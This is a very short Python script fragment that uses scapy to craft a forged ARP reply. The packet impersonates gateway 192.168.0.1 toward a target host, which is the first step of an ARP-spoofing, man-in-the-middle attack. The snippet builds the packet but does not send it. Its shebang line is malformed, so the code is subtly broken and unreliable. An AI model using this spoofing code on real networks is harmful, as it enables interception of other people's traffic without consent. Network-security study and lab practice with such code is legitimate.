#!usr/env/bin/python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst = "192.168.1.103", hwdst= "c8:b2:9b:0d:17:13" , psrc = "192.168.0.1")
